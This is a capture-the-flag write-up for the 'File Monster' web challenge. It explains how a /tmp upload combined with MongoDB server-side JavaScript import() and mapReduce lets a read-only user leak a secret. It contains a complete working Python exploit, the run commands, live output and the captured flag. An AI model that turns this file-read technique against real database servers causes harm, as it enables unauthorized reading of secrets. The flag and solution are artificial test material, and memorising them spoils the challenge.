# File Monster — NNS CTF 2026 — SOLVED

**Category:** Web / misc · **Author:** piprett
**FLAG:** `NNS{60oD_Job_g3ttiN6_7hi5_tas7y_fla6_fr0m_7he_Fla6_m0ns7er}`

Solved 2026-09-05 (local session). Extracted from the live instance
(`file-monster-27940f46ada6`) deterministically — no brute force.

---

## TL;DR of the intended bug

1. `POST /upload` writes attacker text to `/tmp/<name>` (name `^[a-zA-Z][a-zA-Z0-9.]*$`),
   stripping `"` `'` `` ` `` and replacing the **first** `FLAG` with `process.env.FLAG`.
   So we can author an arbitrary **quote-free** file in `/tmp`, with the real flag
   substituted into it.
2. mongo `viewer/viewer` is read-only + JS-sandboxed (no fs/env/exec) **BUT** the
   server-side JS engine (SpiderMonkey in mongod 8.2.10) has a working **`import()`**.
   `import('/tmp/x')` makes **mongod actually `openat()` and load the file as an ES
   module** from the shared `/tmp` (bun + mongod share the container fs).
3. In `$function` the import Promise never settles (no event-loop drain) — **but inside
   a multi-document `mapReduce`, the JS job queue DRAINS between map invocations and
   `globalThis` persists across map calls within the one query.** So the imported module
   **evaluates**, and its rejection/side-effects become observable on the 2nd+ map call.
4. Exfil: upload a wrapper module that embeds the flag via the `FLAG` substitution and
   turns it into readable data **without quotes**, using a **regex literal**:
   `globalThis.__LK = (/FLAG/).source` → after substitution `(/NNS{...}/).source`
   → the full flag string. Read `globalThis.__LK` back through the mapReduce drain.

The `class FLAG` / `getOwnPropertyNames(new C())` variant also works but only for
identifier-safe flag bodies; the real flag (`60oD...`, digit-then-letter) broke class
parsing (`identifier starts immediately after numeric literal`). **Regex `.source` is the
robust extractor** (works for any flag without `/` or newline).

Why the deliberate hints fit: strip `"'`` = stop us breaking out of the JS the module
loader parses; `enableLocalhostAuthBypass:false` = red herring / defense-in-depth
(we never appear as localhost — `whatsmyuri` = pod IP 10.x).

---

## Final working exploit (`scratchpad/exploit3.py`)

```python
import sys, subprocess, random, string, json
from pymongo import MongoClient
from bson.code import Code

MONGO=sys.argv[1]; UPLOAD=sys.argv[2]; EXTRA=sys.argv[3] if len(sys.argv)>3 else ""
c=MongoClient(MONGO, serverSelectionTimeoutMS=15000); db=c["file-monster"]
rnd=''.join(random.choice(string.ascii_lowercase) for _ in range(7)); modname=rnd+".js"

# regex literal captures the flag as raw text; .source = full "NNS{...}". No quotes needed.
content = "globalThis.__LK_%s=(/FLAG/).source" % rnd
cmd=["curl","-s"]+([EXTRA] if EXTRA else [])+["-F","file=@-;filename=%s"%modname, UPLOAD]
p=subprocess.run(cmd, input=content.encode(), capture_output=True)
print("UPLOAD:", p.stdout.decode()[:200])

# mapReduce over >=2 docs => job queue drains between map calls; globalThis persists
mp = Code("""function(){
  if(typeof globalThis.__d==='undefined'){globalThis.__d=1; globalThis.__o='PENDING';
    import('/tmp/%s').then(function(m){ try{ globalThis.__o='OK:'+JSON.stringify(globalThis.__LK_%s);}catch(e){globalThis.__o='POST:'+String(e);} },
                           function(e){ globalThis.__o='REJ['+String(e.name)+']:'+String(e.message); });
  }
  emit(NumberInt(Math.floor(Math.random()*1e9)), globalThis.__o);
}""" % (modname, rnd))
rd = Code("function(k,v){return v.join('~~')}")
res=db.command('mapReduce','files',map=mp,reduce=rd,out={'inline':1})
vals=set(r['value'] for r in res.get('results',[]))
print("RESULTS:", vals)
for v in vals:
    if v.startswith("OK:"): print("FLAG =>", json.loads(v[3:]))
```

Run (endpoints rotate — re-check challenge page):
```bash
MONGO="mongodb://viewer:viewer@file-monster-db-<id>.chall.nnsc.tf:1337/?authSource=file-monster&tls=true&tlsAllowInvalidCertificates=true"
UP="https://file-monster-<id>.chall.nnsc.tf/upload"
python3 exploit3.py "$MONGO" "$UP" "-k"
```
Needs: pymongo (WSL had 4.18). `files` collection must have >=2 docs (upload a couple
first so mapReduce calls `map` multiple times → the drain).

Live output:
```
UPLOAD: {"ok":true,"filename":"hawhgkn.js","path":"/tmp/hawhgkn.js",...}
RESULTS: {'OK:"NNS{60oD_Job_g3ttiN6_7hi5_tas7y_fla6_fr0m_7he_Fla6_m0ns7er}"', 'PENDING'}
FLAG => NNS{60oD_Job_g3ttiN6_7hi5_tas7y_fla6_fr0m_7he_Fla6_m0ns7er}
```

Note: the exploit does NOT need `/tmp/flag` — the flag is embedded straight into the
wrapper module by the `FLAG` substitution, so `import('/tmp/<rnd>.js')` evaluates it.

---

## The investigation path (what was ruled out, and the breakthrough)

Re-confirmed dead on the live instance (all covered in old HANDOFF, re-verified):
- viewer 100% read-only: insert/create/create-view/create-wiredTiger-configString/
  mapReduce-out/$out/$merge/createIndexes/collMod/setParameter all `not authorized`.
- mongo JS sandbox identical & closed across `$function`/`$where`/`mapReduce`/`$accumulator`:
  103 enumerable globals, only `print/sleep/gc` among exec-ish; no fs/env/process/require/
  load/read; hidden lexical globals (`_doassert`) unreachable from our scope; `$_externalDataSources`
  gated behind `enableComputeMode=false`; cross-db (admin/local.startup_log) blocked;
  `getParameter '*'` blocked.
- web app provably write-only to `/tmp` (strace of bun: serves `/`,`/robots.txt`,`/chunk-*`
  entirely from embedded bunfs, **zero disk reads**; only `Bun.file().exists()` + `Bun.write()`
  touch /tmp). filename regex airtight; 500s ("Something went wrong!") leak nothing.
- flag exists ONLY as `/tmp/flag` content (which WE author via substitution) + `process.env.FLAG`
  of bun & mongod. Nothing reads `/tmp/flag` at runtime (inotify confirmed only bun writes it).

Breakthrough came from **local Docker repro** (`docker build -t filemonster .`, run with
`--cap-add SYS_PTRACE`, install strace/inotify/python3-pymongo, connect viewer at
127.0.0.1:27017):
- `strace mongod` while a viewer `$function` ran `import('/tmp/flag')` →
  `openat(AT_FDCWD, "/tmp/flag", O_RDONLY) = 45`. **mongod reads arbitrary /tmp files via
  server-side JS `import()`.** (This is the file-read primitive the whole chall hinges on.)
- `$function` doesn't drain the Promise job queue (module never evals, rejection lost).
- **mapReduce over ≥2 docs DOES drain between map calls** and `globalThis` persists within
  the query → module evaluation + rejection handlers run → observable.
- Direct `import('/tmp/flag')` → `SyntaxError: unexpected token '{'` (position only, no content).
  `import(file-whose-content-is-a-bare-identifier)` → `ReferenceError: <content> is not defined`
  (leaks full content!). Regex `.source` wrapper generalises this to any flag text.

Local env facts: bun runs as root, `CWD=/`, `HOME=/data/db`; mongod dbPath `/data/db`
(NOT /tmp); `/tmp` holds only the mongod unix socket + our uploads; deps bun 1.4.1,
mongoose 9.9.2, mongodb driver 7.5.0, bson 7.3.2.

---

## Key one-liner primitives (for future mongo-JS challenges)

- mongod 8.2 server-side JS `import('/abs/path')` = **arbitrary server-side file open+parse**
  from the mongod process, available to a plain read-only user (`$function`/`mapReduce`).
- No event loop in `$function`; **mapReduce map across multiple docs drains microtasks/jobs**
  and shares `globalThis` across `map` invocations of one query → async results observable.
- Quote-free string capture in JS: **regex literal `/TEXT/.source`** (no `"'`` needed).

Local container still running as `filemonster` / container `fm` if you want to keep poking;
`docker rm -f fm; docker rmi filemonster` to clean up.
